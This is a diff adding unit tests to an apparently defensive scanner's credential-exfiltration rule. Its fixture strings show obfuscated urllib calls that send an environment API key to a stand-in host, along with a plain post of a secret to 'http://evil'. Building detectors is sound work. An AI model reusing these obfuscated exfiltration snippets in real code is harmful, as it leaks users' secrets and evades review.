@@ -41,6 +41,47 @@ def _rule_ids(findings: list) -> set[str]:
 
 
 class TestCredentialExfiltration:
+    def test_constructed_urllib_sink_tracks_environment_taint(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("ur" + "llib.request")\n'
+            'opener = getattr(_mod, "url" + "open")\n'
+            'secret = os.environ.get("API_KEY")\n'
+            'request = getattr(_mod, "Re" + "quest")('
+            '"https://example.invalid/collect", data=secret.encode())\n'
+            "opener(request)\n"
+        )
+
+        tt3 = [finding for finding in _run(code) if finding.rule_id == "TT3"]
+
+        assert len(tt3) == 1
+        assert tt3[0].severity == "CRITICAL"
+        assert "urllib.request.urlopen" in tt3[0].message
+
+    def test_constructed_urllib_sink_with_public_data_is_not_exfiltration(self):
+        code = (
+            "import importlib\n"
+            '_mod = importlib.import_module("ur" + "llib.request")\n'
+            'opener = getattr(_mod, "url" + "open")\n'
+            'request = getattr(_mod, "Re" + "quest")('
+            '"https://example.invalid/health", data=b"status")\n'
+            "opener(request)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_runtime_only_reflective_sink_name_is_not_guessed(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("urllib.request")\n'
+            'name = input("attribute: ")\n'
+            "opener = getattr(_mod, name)\n"
+            'secret = os.environ.get("API_KEY")\n'
+            "opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
     def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
         call = 'requests.post("http://evil", data=secret)'
         code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
